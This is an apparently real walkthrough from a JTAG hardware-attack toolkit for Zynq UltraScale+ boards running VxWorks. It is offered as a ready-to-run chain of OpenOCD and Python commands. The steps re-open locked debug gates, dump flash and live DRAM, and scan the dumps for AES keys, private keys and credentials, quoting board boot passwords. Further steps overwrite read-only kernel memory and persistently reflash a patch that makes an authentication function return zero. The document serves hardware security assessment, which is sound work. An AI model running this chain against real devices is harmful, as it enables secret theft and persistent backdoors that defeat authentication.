# 21 Walkthrough

A complete worked run, **box-on-the-bench → understanding the board → opening it → owning it**,
chaining the whole toolkit. Every step is a real command; the offline analysis steps are run on
your host, the `openocd …` steps talk to the target. Two capability demonstrations close it out, and
the first feeds the second.

Each step lists the command, **what you should see** when it works, and **if it fails** the first
thing to check — so this doc is followable live on the bench, not just a command index.

**General safety posture:** every read step below is non-destructive. The only state-changing steps
are **Phase 2** (`reopen-debug`, register writes that a power-cycle reverts) and **Capability 2**
(`probe-phys-patch`, which restores what it changed). Nothing here blows an eFuse. If a step wedges
the DAP (the dominant failure mode), the recovery is a JTAG reset / power-cycle — see
`reference_dap_wedge`.

## Map of the run

```
PHASE 0  Connect & identify     probe-board.sh                 -> openocd/<soc>.cfg + access verdict
PHASE 1  Understand the board   jtag-access-check -> enumerate -> interpret   -> Security Posture + Triage
PHASE 2  Open the board         reopen-debug.tcl (+ Tier-1)    -> Debug Lockdown Bypass (if gated)
PHASE 3  Harvest board profile  harvest-profile.tcl            -> boards/<soc>.env (scripts auto-adapt)
CAP 1    Extract the firmware   qspi-jtag DMA dump -> parse-bootimage --extract -> vxworks-symtab -> Ghidra
CAP 2    Own the live system    probe-phys-patch  (uses CAP 1's symbol addresses)
```

## PHASE 0 — Connect & identify (unknown board → ready cfg)

Physically connected (adapter wired, Vref/GND, correct I/O voltage). One read-only command takes the
board from "unknown" to a ready-to-use config + an access verdict, stopping at the first failed gate:

```bash
tools/probe-board.sh   # zero-flag: adapter -> speed-ladder chain scan -> decode IDCODE
                       #   -> (ZynqMP?) gen openocd/<soc>.cfg -> access verdict, recorded in the cfg
```

**You should see:** the detected adapter (`lsusb` line), a chain scan that settles on a working TAP
speed, one or more **IDCODEs** decoded to a part (e.g. `0x...` → `XCZU9EG`, SoC `zynqmp-zu9`), a
written `openocd/<soc>.cfg`, and an **ACCESS VERDICT** of `OPEN / RESTRICTED / LOCKED / NO-DAP /
NO-CHAIN`.

**If it fails:**
- *NO-CHAIN / no IDCODE* → wiring or Vref. Re-seat, confirm I/O voltage, drop the adapter speed.
  Nothing downstream works until the chain scans.
- *Decodes but "not ZynqMP"* → `probe-board.sh` refuses to emit a ZynqMP cfg for a
  Zynq-7000/Versal/non-Xilinx part (by design). That's a correct stop, not a bug.
- *Verdict ≠ OPEN* → that's itself a finding: the production access controls are doing their job.
  See `docs/18` Stage 4 for what each verdict means and how to push further (Phase 2 may still
  re-open it).

*(On the known ZCU102 you can skip straight to `openocd/zcu102.cfg`.)*

## PHASE 1 — Understand the board (enumerate → interpret)

> **Note — step 1a (gate check) is only needed if you skipped Phase 0 and are connecting to a
> "known" board.** If `probe-board.sh` was run, it already did this check; skip 1a and go to 1b.

**1a. Gate check (non-destructive).** Confirm the DAP is actually usable before the heavy read:

```bash
openocd -f openocd/zcu102.cfg -c "init; source openocd/jtag-access-check.tcl; shutdown"
```

**You should see:** OpenOCD's `init` print the chain IDCODEs, then an **ACCESS VERDICT** line —
`OPEN` (DP power acks + AP probe + benign reads all succeed), `RESTRICTED` (DAP answers but reads
are filtered), `LOCKED` (DAP present, secured), `NO-DAP` (TAP but no debug port), or `NO-CHAIN`.
Only `OPEN` greenlights the full enumerate; the script prints the recommended next command. **If it
fails:** `RESTRICTED`/`LOCKED` → go to Phase 2 (`reopen-debug`) before enumerating.
`NO-DAP`/`NO-CHAIN` → back to Phase 0 wiring.

**1b. Enumerate the full security posture** (capture on-site, fast):

```bash
openocd -f openocd/zcu102.cfg -c "init; source openocd/enumerate.tcl; shutdown"
#   -> reports/raw-<ts>.json  (+ a human reports/enumerate-<ts>.md)
```

**You should see:** a stream of register reads (CSU/CRL/PMU/eFuse/TrustZone sections) and, on
success, two new files in `reports/` (a `raw-<ts>.json` and `enumerate-<ts>.md`). Takes seconds to a
couple of minutes. **If it fails:** a mid-run `SLVERR`/wedge on one block is usually tolerated (the
script continues); a hard hang early means the DAP wedged — reset/power-cycle and re-run after
`jtag-access-check` reports `OPEN`.

**1c. Interpret offline** (analyze repeatedly without touching hardware):

```bash
python3 tools/interpret.py "$(ls -t reports/raw-*.json | head -1)" -O
#   -> reports/interpreted-<ts>.md
```

**You should see:** an `interpreted-<ts>.md` written, opening with the **Engagement Triage** banner
and the **Security Posture Summary**. This step is pure host-side analysis — re-run it as often as
you like on the same capture. **If it fails:** a stack trace usually means a malformed/truncated raw
JSON (enumerate didn't finish) — re-capture 1b.

Read the top of the interpreted report:
- **Engagement Triage** banner — board state verdict (`ALL-OPEN / PARTIALLY-PROVISIONED / HARDENED`)
  plus the gated list of *which tools to run next*.
- **Security Posture Summary** — the `OFF/dev → ON/provisioned` checklist for secure-boot policy,
  JTAG/debug gates, eFuse locks, key state, anti-tamper, TrustZone. `docs/11` is the full attribute
  catalog (dev value vs hardened meaning vs why it matters).

After Phase 1 you know what the board *is* and what's open vs enforcing. On the ZCU102 dev board the
triage reads **ALL-OPEN** (the baseline); a fielded target lights up some of the checklist.

## PHASE 2 — Open the board (Debug Lockdown Bypass)

If the triage/posture shows the **debug gates closed** (software lockdown, not eFuse), re-open them:

```bash
openocd -f openocd/zcu102.cfg -c "init; source openocd/reopen-debug.tcl; shutdown"
```

Writes `CSU.JTAG_SEC`/`JTAG_DAP_CFG` back to open via the AXI-AP and **reads back to confirm**.
`JTAG_SEC` is reported **per field** — `DAP_SEC` (the ARM-DAP gate that controls A53/R5 core debug),
`PLTAP_SEC` (PL TAP), `PMU_SEC` (PMU BSCAN, commonly eFuse-locked). The verdict:
- `DEBUG RE-OPENED` → it was software register state (reversible); the write stuck on read-back,
  debug is back, continue. (`(all gates)` vs `(ARM core debug)` — the latter when `DAP_SEC` opened
  but `PMU_SEC`/`PLTAP_SEC` stayed eFuse-locked, which is **still a win** — they gate PL/PMU only.)
- `LOCKED` → eFuse-protected (the write doesn't stick) — not reversible by register write.
  **Note:** the AXI-AP mem path is often still up, which is enough for enumerate / qspi-jtag /
  dump-os-ddr / physical patch even without core debug.
- `PARTIAL` → one register opened (software state), the other eFuse-locked. Work with what opened.
- `NO AXI-AP WRITE PATH` → re-open via a code-exec path instead (see Tier-1 below).

**If it fails / unexpected:** a `LOCKED` verdict is a *result*, not an error — it tells you the board
is eFuse-hardened. A wedge mid-write → reset and re-run.

*(Session-only: a power-cycle restores the boot-time gates. For persistence, patch the boot image so
`psu_init`/FSBL stops re-closing them — see "Persistence" under Capability 2.)*

On the all-open dev board this is a no-op (already open, read-back trivially confirms) — but it's the
gate that makes a hardened target's capabilities reachable.

### If reopen-debug can't open it — other levers (Tier-1)

When the **DAP-side** write is filtered (master-aware AXI filter) but the bits aren't eFuse-locked,
three alternate writers try the same gate. Each ends in a RE-OPENED / PARTIAL / NOT-REOPENED verdict:

```bash
# (1) EL3 CPU-side write — a halted core writes the gate from the inside (COLD mode freezes the OS):
openocd -f openocd/zcu102.cfg -c "init; source openocd/reopen-via-code.tcl; shutdown"

# (2) PMU PM_MMIO_WRITE — the PMU writes the gate from above the AXI filter (needs PMU FW running):
openocd -f openocd/zcu102.cfg -c "init; set ::BOOTED_STATE 1; set ::BOOTROM_METHOD pmu-mmio-write; \
  source openocd/dump-bootrom.tcl; shutdown"

# (3) CSUDMA alternate master — a different bus master writes the gate:
openocd -f openocd/zcu102.cfg -c "init; source openocd/reopen-debug-csudma.tcl; shutdown"
```

**You should see:** each reports the gate's before/after and whether the write stuck. **If all of
them report the write doesn't stick**, the gate is genuinely **eFuse-locked** — the remaining levers
are a Tier-2 boot-image patch (e.g. JustSTART / CVE-2023-20570 on an enforcing board, `docs/15`) or
Tier-4 fault injection (out of pure-JTAG scope). A board that refuses to open is itself the finding.

## PHASE 3 — Harvest the board profile (scripts auto-adapt)

One read-only pass records the per-board variables every capability script auto-sources, so nothing
downstream is hand-edited:

```bash
BOARD_SOC=zynqmp-zu9 openocd -f openocd/zcu102.cfg \
  -c "init; source openocd/harvest-profile.tcl; shutdown"
#   -> boards/zynqmp-zu9.env  (target/DAP names, BOOT_MEDIA from the BOOT_MODE reg, DDR base, ...)
```

**You should see:** a printed summary — `boot media` (decoded from the `BOOT_MODE` register: QSPI /
SD / JTAG / …), the `flash read` helper command for that medium, the `ddr base`, and a confirmation
that `boards/<soc>.env` was written and that `reopen-debug` / `dump-os-ddr` / `dump-boot-flash` now
auto-source it. **If it fails:** if `BOOT_MEDIA` reads unexpectedly, the board may have been strapped
differently than it boots — note it; the capability scripts still let you override via env vars.

From here, the capability scripts resolve everything with precedence
`env > boards/<soc>.env > runtime-detect > default` — the same commands run unchanged on any board.

## CAPABILITY 1 — Extract & analyze the firmware

Goal: get the board's **boot image** off the flash, break it into its parts, and turn the OS
partition into a named, analyzable Ghidra database. This is both a deliverable on its own (firmware
for offline RE) **and** the address source that powers Capability 2.

### 1.1 Dump the boot image — fast, strap-free, over JTAG

`qspi-jtag.tcl` drives the GQSPI controller directly over the AXI-AP, so it reads the flash from a
**live, strap-locked board** — no U-Boot, no DDR bring-up, no boot-mode change (the engagement case).
It has two read paths: a fast **DMA** dumper (default for bulk) and a slow **PIO** fallback.

**(a) Self-test first** — proves the DMA path and reports the per-session DST-FIFO "lead-in":

```bash
QSPI_OP=dmaread QSPI_LEN=4096 \
  openocd -f openocd/zcu102.cfg -c "init; source openocd/qspi-jtag.tcl; shutdown"
```

**You should see:** the `GQSPI JEDEC-ID self-test` (RDID `0x20 0xBB 0x20` → **Micron MT25QU512**,
dual-parallel, 128 MB, SPI mode 3), then `RESULT: PASS — DMA data matches the PIO read`. **If it
fails:** all-`0x00`/`0xFF` RDID → the AXI-AP can't reach the GQSPI MMIO (debug gated → do Phase 2
first) or the flash isn't powered/strapped to the PS QSPI; a `MISMATCH` → use the PIO fallback below.

**(b) Dump the full image — run ONE of the three commands below** (they're alternatives, not steps;
the first is the default for an engagement). All write `dumps/boot-image.bin`.

**→ Default: the resilient driver** (chunks + auto USB-reset between chunks, survives the FTDI
wedging under sustained DMA traffic through VMware passthrough):

```bash
tools/qspi-dump.sh 0xB00000 dumps/boot-image.bin
```

**You should see:** per-chunk `OK (~9 KB/s, 0 uncovered)` lines and a final
`DONE: ... (11534336 bytes, md5 ...)`. `0xB00000` (11 MB) is a safe window; the real image is
**~10.44 MB**, the rest erased `0xFF`. ~9 KB/s (~9× PIO), so ~20–25 min for 11 MB, auto-recovering
through any wedge. **If it fails:** a chunk that fails 3× aborts with a partial dump — re-run (the
driver USB-resets the adapter before each chunk). **This is the one to use unless you have a reason
not to — the two below are alternatives, you do NOT run them after this.**

**Or — direct DMA, no driver** (one openocd invocation, faster to launch; but a long single run can
wedge the FTDI partway, which the driver above is built to survive):

```bash
QSPI_OP=dmadump QSPI_SIZE=0xB00000 QSPI_OUT=dumps/boot-image.bin \
  openocd -f openocd/zcu102.cfg -c "init; source openocd/qspi-jtag.tcl; shutdown"
```

**Or — PIO fallback** (guaranteed-correct, but ~1 KB/s, so hours for the full image; use only if the
DMA path can't reach the controller, e.g. `dmaread` returned `MISMATCH`):

```bash
QSPI_OP=dump QSPI_SIZE=0xB00000 QSPI_OUT=dumps/boot-image.bin \
  openocd -f openocd/zcu102.cfg -c "init; source openocd/qspi-jtag.tcl; shutdown"
```

> **FTDI wedged?** (`LIBUSB_ERROR` / "error while flushing MPSSE queue") — the adapter locks up under
> sustained DMA traffic through VMware. Reset it without a physical re-plug:
> `usbreset $(lsusb | awk '/0403:/{printf "/dev/bus/usb/%s/%s",$2,substr($4,1,3)}')` (any FTDI).
> `qspi-dump.sh` / `dram-dump.sh` do this automatically between chunks. The real speed fix is running
> OpenOCD **natively on the host (outside VMware)** at a higher stable TCK — also ~10–30× faster than
> the 1 MHz VMware cap.
>
> **Different JTAG adapter?** Everything that talks to the *target* is adapter-agnostic (it goes
> through OpenOCD's DAP/mem-AP). Only two things change: **(1)** point the scripts at a cfg for your
> adapter — `QSPI_CFG=…` / `DRAM_CFG=…`, or `board-template.cfg` (env-driven `JTAG_IFACE`), or
> `probe-board.sh` to generate one; **(2)** the auto USB-reset defaults to any FTDI — set
> `JTAG_USB=VID:PID` for a non-FTDI adapter (it's a harmless no-op if it doesn't match, and non-FTDI
> adapters rarely wedge). See `docs/18` for new-adapter/new-board bring-up.

### 1.2 (optional, separate artifact) Dump the live OS straight from DRAM

> **Which artifact feeds the rest of Capability 1?** The flash boot image from **1.1**. The parse +
> Ghidra steps (1.3–1.6) all run on `dumps/boot-image.bin` — it's a structured *container* (Boot
> Header → IHT → PHT) whose kernel partition has a known **link VA base** (`0xFFFFFFFF80100000`) and
> the embedded symbol table, which is exactly what `parse-bootimage` / `ghidra-loadspec` /
> `vxworks-symtab` need. **This 1.2 DRAM dump is a *different* thing** — the *running* image (already
> decompressed, relocated to its runtime address, carrying any in-memory patches). It's **not** a
> boot-image container (you can't `parse-bootimage` it) and sits at a different base. Grab it for
> **runtime forensics** (in-memory state / live modifications) or as a **fallback when you can't read
> the flash** — otherwise skip straight to 1.3 with the 1.1 image.

The running kernel is already decompressed in DRAM — grab it directly (no flash needed). **Two ways,
pick by goal:**

**→ Targeted** (just the loaded kernel region — fast, usually enough):

```bash
DUMP_ADDR=0x00100000 DUMP_SIZE=0x02000000 DUMP_LABEL=os-live \
  openocd -f openocd/zcu102.cfg -c "init; source openocd/dump-os-ddr.tcl; shutdown"
#   -> dumps/os-live.bin   (the *running* image, incl. any in-memory patches; OS load addr from Phase-1 enum)
```

**→ Capture everything — sparse full-DDR, resilient driver.** `dram-dump.sh` is the DRAM analog of
`qspi-dump.sh`: it chunks the address range, USB-resets the FTDI between chunks (a multi-hour capture
otherwise wedges it), and assembles a **sparse** image — while each chunk runs sparse internally
(probe each 1 MB block, read only the non-zero ones). So you grab *all* of RAM without the ~89-hour
linear read of a mostly-zero 4 GB DDR, and survive the wedging:

```bash
tools/dram-dump.sh 0x0 0x80000000 dumps/ddr-full.bin      # low 2 GB; DUMP_HALT=1 for a frozen snapshot
#   -> dumps/ddr-full.bin   (2 GB apparent; only the USED RAM is read & on disk — see the per-chunk tally)
```

(Direct, no driver — fine for a small targeted range, but a long run may wedge:
`DUMP_ADDR=0x0 DUMP_SIZE=0x80000000 DUMP_SPARSE=1 DUMP_LABEL=ddr-full openocd -f openocd/zcu102.cfg -c "init; source openocd/dump-os-ddr.tcl; shutdown"`.)

**You should see:** per-chunk `OK (kept N blocks (M MB read))` lines and a final `DONE: … apparent …,
~X on disk` — so you see exactly how much RAM was actually in use. **If it fails:** an empty/zero dump
means DDR isn't up (no running OS) — this step assumes a live board; use 1.1 (flash) instead, or bring
DDR up over JTAG (`jtag-ddr-boot.tcl`, `docs/16`).

> **Speed reality:** the read is JTAG-bandwidth-bound (~12 KB/s at the 1 MHz VMware-passthrough cap),
> so even the *used* RAM is slow — sparse mode avoids the zeros, but hundreds of MB of live data is
> still ~hours. The real fix is running OpenOCD **natively (outside VMware)** at 10–30 MHz. Set
> `DUMP_HALT=1` to freeze the cores for a consistent snapshot (it resumes after; power-cycle if the OS
> doesn't continue). A long capture can wedge the FTDI — same `usbreset` recovery as 1.1.

**Then — pull the runtime-only secrets** (the whole reason to grab DRAM). `dram-secrets.py` scans the
dump for material that is **not** in the static flash image: decrypted keys, the VxWorks boot line
(network-boot `u=`/`pw=`), login credentials, in-memory certs/private keys, session tokens, connection
strings, and high-entropy key candidates:

```bash
python3 tools/dram-secrets.py dumps/os-live.bin --base 0x100000 -o reports/dram-secrets.md
```

**You should see:** a ranked report (CRIT/HIGH first) grouped by category — `aes-key` (AES keys whose
key **schedule validates** — near-zero false positives), `vxworks-bootline` (`u=`/`pw=`), `conn-string`
(URLs with creds), `pem` (private keys), `pw-hash` (crypt/shadow), `token` (JWT / AWS / API key /
bearer), `cred-string`, `der` (certs/keys), `crypto-anchor` (AES S-box / SHA constants — keys & IVs
live nearby), and `key-candidate` (high-entropy windows — heuristic, capped). Each finding shows its
address (`--base` maps the file offset to the physical `DUMP_ADDR`). No `aes-key` line is a *confident*
negative, not "didn't notice." *(On this board the scanner surfaces the compiled-in boot creds
`u=target pw=vxTarget` / `u=ultraNP pw=ultraNP`; a live dump adds runtime-only material.)* **If it
fails / empty:** the dump was zero/short (DDR not up) — re-check the dump above.

**Then — symbol-guided extraction** (the targeted complement: don't scan blindly, read the *named*
crypto globals). Using the symbol map from **1.5**, `symbol-crypto.py` finds crypto/credential-named
globals (`*key*`, `*ssl*`, `*aes*`, `*secret*`, …), maps each to its dump offset, reads it, and
**validates** what's there (AES key-schedule, string, high-entropy):

```bash
python3 tools/symbol-crypto.py dumps/os-live.bin --syms dumps/symbols.txt -o reports/sym-crypto.md
#   full-DDR dump (byte 0 = PA 0x0)?  add  --dump-base 0x0
```

**You should see:** a per-symbol report ranked `[AES KEY]` (validated) → `[HIGH-ENTROPY]` → `[string]`
→ `[data]`, each with the symbol name, VA, dump offset, and a preview. This pinpoints keys by *where
they're named to live* instead of guessing by entropy. **If it fails:** "cannot read symbol map" →
generate it first in 1.5; everything mapping out-of-range → wrong `--dump-base` for your capture.

### 1.3 Separate the boot image into its partitions

```bash
python3 tools/parse-bootimage.py dumps/boot-image.bin --extract dumps/parts/
#   -> dumps/parts/  with each partition carved + labelled: fsbl / bl31-or-bootapp / pmufw / kernel-or-app
```

**You should see:** a structural dump (Boot Header → Image Header Table → Partition Header Table),
any posture findings from the rule engine, and a `dumps/parts/` dir with one labelled `.bin` per
partition. The `kernel-or-app` partition (DDR load address, e.g. `0x100000`) is the OS kernel. **If
it fails:** "bad BH magic" → the dump isn't aligned to the boot-image start (offset into the flash)
or it's encrypted — check the Phase-1 posture for an encrypt-only/auth bit.

### 1.4 Determine the Ghidra load settings (from the bytes)

```bash
python3 tools/ghidra-loadspec.py dumps/parts/part*_kernel-or-app_*.bin
#   -> Language (e.g. AARCH64:LE:64) + Base Address (the link VA, e.g. 0xFFFFFFFF80100000),
#      with a disassembly preview so you can confirm it's real code
```

**You should see:** a recommended **Language** and **Base Address**, plus a short disassembly preview
at that base — readable prologue-looking instructions confirm the base is right. **If it fails:**
garbage disassembly → try the alternative base it suggests, or the partition isn't raw code
(compressed/encrypted).

### 1.5 Symbolize (if the kernel embeds a symbol table — many VxWorks/RTOS images do)

```bash
python3 tools/vxworks-symtab.py dumps/parts/part*_kernel-or-app_*.bin \
  --va-base 0xFFFFFFFF80100000 \
  --out-ghidra dumps/symbols_ghidra.py --out-map dumps/symbols.txt
#   -> thousands of name->address symbols + a Ghidra import script
```

**You should see:** a count of recovered symbols (the ZCU102 VxWorks image yields **16,331**), and
the two output files written. **If it fails:** zero symbols → the image is stripped or not VxWorks;
skip symbolization and analyze unnamed in Ghidra.

### 1.6 Analyze in Ghidra

1. **File → Import File** → the kernel partition · **Format:** Raw Binary · **Language/Base:** from 1.4.
2. **Script Manager** → run `dumps/symbols_ghidra.py` → functions get their real names.
3. **Auto Analyze** → navigate by name, read decompiled C, plan changes.

**You should see** the function list populate with real names after step 2, and clean decompilation
after auto-analysis. **Output of Capability 1:** the firmware in hand (pristine boot image +
per-partition files), the OS kernel as a *named* Ghidra database, and `dumps/symbols.txt` mapping
every function to its address. That symbol map is the key input to Capability 2.

## CAPABILITY 2 — Own the running system (unauthenticated physical memory R/W)

Goal: read and **modify the memory of the *running* OS** over JTAG, defeating the MMU's protection —
i.e., arbitrary live-kernel code patching. This is the realized payoff of the open DAP, and **it uses
Capability 1's addresses to know *what* to patch.**

### Why it works

The AXI-AP is a **bus master**: it issues *physical* memory accesses straight to the interconnect.
The MMU's read-only `.text` permission only constrains the *CPU's virtual* accesses — so a physical
write via the AXI-AP overwrites "read-only" kernel code that the core itself could not. (See
`project_capability_demo_kernel_patch`.)

### The demo

```bash
openocd -f openocd/zcu102.cfg -c "init; source openocd/probe-phys-patch.tcl; shutdown"
```

> **Run it the safe way on a flaky DAP (VMware passthrough).** `PATCH_HALT=0` + a `PATCH_VA` makes the
> demo **pure AXI-AP — zero core interaction**, so it can't wedge the A53 DTR or crash OpenOCD:
> ```bash
> PATCH_VA=0xFFFFFFFF80928678 PATCH_HALT=0 PATCH_STR='JTAG-OWNED!' PATCH_RESTORE=0 \
>   openocd -f openocd/zcu102.cfg -c "init; source openocd/probe-phys-patch.tcl; shutdown"
> ```
> *(Single-quote `PATCH_STR` in zsh. A `!` inside `"double quotes"` triggers zsh history expansion and
> hangs the shell at a `dquote>` prompt — single quotes pass it through literally. Press Ctrl-C if you
> hit `dquote>`.)*
> The default (no args) halts core 0 and reads `pc` — fine on a healthy DAP, but **if you see
> `DSCR_DTR_RX_FULL` / `DSCR.ERR=1` / a segfault, the DTR is wedged from a prior core access:
> power-cycle the board to clear it, then re-run with `PATCH_HALT=0`.** (The script no longer uses
> `virt2phys` — it computes `PA = (VA & 0xFFFFFFFF) − 0x80000000` from the kernel's linear map, so it
> never translates through the core.)

It (optionally) halts core 0, takes a target VA (the live `pc` or your `PATCH_VA`), maps it to PA
arithmetically, reads the bytes via the **AXI-AP**, **physically writes** there, reads back, then
restores (or leaves it). **You should see** a clear **BEFORE / AFTER hex+ASCII** of that memory and a
verdict:

```
 BEFORE  00101000:  ... 56 78 57 6f ...  |VxWorks...|     <- the live kernel bytes (RO to the CPU)
 PATCH   writing word 0xd503201f ...
 AFTER   00101000:  ... 1f 20 03 d5 ...  |. ......|        <- read-only memory changed via the bus master
 VERDICT: READ-ONLY KERNEL MEMORY MODIFIED over JTAG.  (PROVEN)
```

That verdict **is** the proof: the MMU's RO `.text`/`.rodata` only constrains the *CPU's virtual*
stores, but the AXI-AP is a **bus master** whose physical write ignores it. *(Never read through the
core at EL1 — it faults and wedges the A53 DTR; AXI-AP physical path only.)* **If it fails:** the
verdict reads `(BLOCKED)` — the AXI-AP is blocked for that region (DDR XMPU/TrustZone) or the VA isn't
mapped; check "Required security state" below.

### Make it a visible, lasting effect (don't just prove it — show it)

The default reverts immediately. To leave a change you can *see*, target a chosen address and tell it
not to restore. **First, find a good printable-string target** (maps each string in the kernel image
to its runtime VA, ranked by how visible/safe a target it is — prefer one you can *trigger*, e.g.
`'auth failed'`, so you can watch the patched text appear):

```bash
python3 tools/find-patch-target.py dumps/parts/part*_kernel-or-app_*.bin   # or dumps/sd-extract/vxWorks.bin
#   -> ranked VAs + the current string + a ready-to-paste PATCH command for the top pick
```

```bash
# overwrite a printable kernel string and LEAVE it — human-readable before/after (use the VA above,
# and a replacement of EQUAL-OR-SHORTER length so you don't overrun the field):
PATCH_VA=0xFFFFFFFF80XXXXXX PATCH_STR='PWNED-BY-JTAG' PATCH_RESTORE=0 \
  openocd -f openocd/zcu102.cfg -c "init; source openocd/probe-phys-patch.tcl; shutdown"

# or neutralise a check / force a return value with a chosen instruction word, left in place:
PATCH_VA=0xFFFFFFFF80XXXXXX PATCH_WORD=0xd2800000 PATCH_RESTORE=0 \  # mov x0,#0
  openocd -f openocd/zcu102.cfg -c "init; source openocd/probe-phys-patch.tcl; shutdown"
```

**You should see** the readable before/after (e.g. `|VxWorks...|` → `|PWNED-BY-JTAG...|`) and, since
`PATCH_RESTORE=0`, a line telling you to **confirm it from the target** on `ttyUSB0`:
`d 0x<VA>` in the VxWorks shell shows your bytes — a cross-path proof that JTAG changed the memory the
running OS sees. *(Cache caveat: a cached line may read stale until it refills; data/uncached regions
show immediately. For a **guaranteed** behavioral change — not subject to cache — use the persistence
path next: patch the dumped boot image at `VA − link_base`, rebuild with `mkbootimage`, reflash.)*

### How Capability 1 feeds Capability 2 — patch a *chosen* function

The stock demo patches whatever the PC points at. To patch a *specific* function you found in Ghidra:

1. In Ghidra (Cap 1), find the function/instruction to change → note its **VA** (e.g. a login/auth
   check at `usrShellBannerInit` VA `0xFFFFFFFF801032F8`).
2. Convert to the live **physical address** with the offset measured during the demo:
   `PA = VA − 0xFFFFFFFF80000000` (e.g. `0x...32F8`). *(Or the file offset for an on-flash patch:
   `VA − link_base` from `ghidra-loadspec`.)*
3. Patch it live via the AXI-AP at that PA (the `probe-phys-patch` write primitive), or for a
   **persistent** change, patch the byte in the dumped boot image (`VA − link_base`), rebuild with
   `mkbootimage`, and reflash — so the change is baked into every boot.

So the chain is: **Cap 1** gives you the map (which bytes, at which address, mean what) → **Cap 2**
is the write primitive that applies the change to the live system (or, persisted, to the flash).

### Required security state (what makes Cap 2 possible)

Both halves need the all-open debug posture (the Phase-1 posture summary checks each):
`EFUSE.JTAG_DIS=0`, `JTAG_SEC.DAP_SEC` open, `JTAG_DAP_CFG.APU_DBGEN=1` (halt/translate), DAP
powered, and `DDR_XMPU`/TrustZone not blocking the AXI-AP for the target region. Phase 2
(`reopen-debug`) is what restores these on a software-hardened board; if they're eFuse-locked, Cap 2
is refused — and the refusal is the finding.

## CAPABILITY 2.5 — Observe the running system (dynamic analysis)

Static dumps show where a secret *sits*; these show it *in flight* — the arguments a function is called
with, the code that touches a key, the caller chain. All use the core's debug logic (HW breakpoints /
watchpoints) and are SMP-aware (the A53s are one cluster — every core is examined + halted to arm, else
OpenOCD refuses the breakpoint/watchpoint).

```bash
# Find where a secret lives in live RAM (no full dump):
MS_PATTERN="PRIVATE KEY" openocd -f openocd/<soc>.cfg -c "init; source openocd/mem-search.tcl; shutdown"
# Who TOUCHES it — a watchpoint on a data address -> the PC that read/wrote it:
WA_ADDR=0x<va> WA_ACCESS=r openocd -f openocd/<soc>.cfg -c "init; source openocd/watch-access.tcl; shutdown"
# Catch a function's ARGUMENTS in flight + the CALLER CHAIN (break, dump x0-x30, deref pointers, unwind):
BC_ADDR=0x<funcVA> BC_DEREF="0 1" BC_BT=1 \
  openocd -f openocd/<soc>.cfg -c "init; source openocd/break-capture.tcl; shutdown"
# symbolize any captured VA / backtrace against the embedded symbol table:
openocd ... source openocd/break-capture.tcl ... | python3 tools/symbolize.py --annotate --syms dumps/symbols.txt
```

Read stack/secrets through the **halted core** (cache-coherent) — the AXI-AP sees stale DRAM for
freshly-written cached data, so a register/watchpoint shows the true value but an AXI read of the same
address may not. break-capture reads registers via `reg <name>` (forces a fetch; `get_reg` returns
OpenOCD's lazily-cached `0` for x2–x30/sp after a halt). Backtrace #00/#01 are register-derived (always
reliable); deeper frames are core-read stack records.

## CAPABILITY 3 — Persist (modify the boot image, reflash over JTAG)

Cap 2 patches the *running* DRAM copy — lost on reboot, and on a cached `.text` page it may not even take
effect (`project_core_side_dynamic_analysis`: a coherent in-place patch needs cache maintenance, which on
ZynqMP/OpenOCD 0.12 wedges the DAP). For a change that **survives power-off**, patch the boot image and write
it back to non-volatile flash — JTAG-native, no SD reader / U-Boot / strap change.

```bash
# 1. patch the dumped boot image (offline) — repack recomputes BH/IHT/PHT checksums:
python3 tools/repack-bootimage.py dumps/boot-image.bin --inspect                  # list partitions
python3 tools/patch-recipe.py --arch aarch64 --func <fn> --syms dumps/symbols.txt --behavior ret0
# 2. prep the QSPI sub-sector read-modify-write (offline; sidesteps Tcl binary I/O):
python3 tools/qspi-make-patch.py dumps/boot-image.bin --offset 0x<logical> --hex <bytes> -o /tmp/qpatch.tcl
# 3. SAFE write-path probes FIRST (no flash change), then the patch (4KB-subsector erase + program + verify):
QW_OP=srtest   openocd -f openocd/<soc>.cfg -c "init; source openocd/qspi-write.tcl; shutdown"  # RDSR both dies
QW_OP=wrentest openocd -f openocd/<soc>.cfg -c "init; source openocd/qspi-write.tcl; shutdown"  # WEL latches
QW_OP=patch QW_DATA=/tmp/qpatch.tcl openocd -f openocd/<soc>.cfg -c "init; source openocd/qspi-write.tcl; shutdown"
# 4. reboot (power-cycle) -> the patched image boots. Verify over JTAG: read the function's .text -> patched.
```

**SAFETY:** a botched flash write can leave the board unbootable **if flash is the only boot source** —
confirm the boot mode first (`BOOT_MODE_USER` 0xFF5E0200 bits[3:0]: 0x2 = QSPI32, 0x3/0x5 = SD) and keep the
original dump to restore (re-run `QW_OP=patch` with the unpatched bytes). On the ZCU102 this was proven
end-to-end: `ret0` written into a VxWorks auth function survived a full power-cycle and ran on the next boot
(`project_qspi_jtag_writer`). The writer was built safe-first: `srtest` → `wrentest` → scratch roundtrip →
real patch.

## One-line recap of the full chain

```bash
tools/probe-board.sh                                                            # 0  identify -> <soc>.cfg
openocd -f openocd/<soc>.cfg -c "init; source openocd/jtag-access-check.tcl; shutdown"   # 1a gate (redundant if step 0 ran)
openocd -f openocd/<soc>.cfg -c "init; source openocd/enumerate.tcl; shutdown"           # 1b posture
python3 tools/interpret.py "$(ls -t reports/raw-*.json | head -1)" -O                    # 1c triage
openocd -f openocd/<soc>.cfg -c "init; source openocd/reopen-debug.tcl; shutdown"        # 2  open it
BOARD_SOC=<soc> openocd -f openocd/<soc>.cfg -c "init; source openocd/harvest-profile.tcl; shutdown"  # 3 profile
QSPI_OP=dmaread QSPI_LEN=4096 openocd -f openocd/<soc>.cfg -c "init; source openocd/qspi-jtag.tcl; shutdown"  # C1 self-test
tools/qspi-dump.sh 0xB00000 dumps/boot-image.bin                                        # C1 dump (fast DMA, resilient)
python3 tools/parse-bootimage.py dumps/boot-image.bin --extract dumps/parts/            # C1 separate
python3 tools/ghidra-loadspec.py dumps/parts/*kernel*.bin                                # C1 loadspec
python3 tools/vxworks-symtab.py dumps/parts/*kernel*.bin --out-ghidra dumps/symbols_ghidra.py  # C1 symbols
openocd -f openocd/<soc>.cfg -c "init; source openocd/probe-phys-patch.tcl; shutdown"    # C2 live patch
BC_ADDR=0x<fn> BC_BT=1 openocd -f openocd/<soc>.cfg -c "init; source openocd/break-capture.tcl; shutdown"  # C2.5 args+backtrace
python3 tools/qspi-make-patch.py dumps/boot-image.bin --offset 0x<off> --hex <bytes> -o /tmp/qpatch.tcl    # C3 prep
QW_OP=patch QW_DATA=/tmp/qpatch.tcl openocd -f openocd/<soc>.cfg -c "init; source openocd/qspi-write.tcl; shutdown"  # C3 persist
```

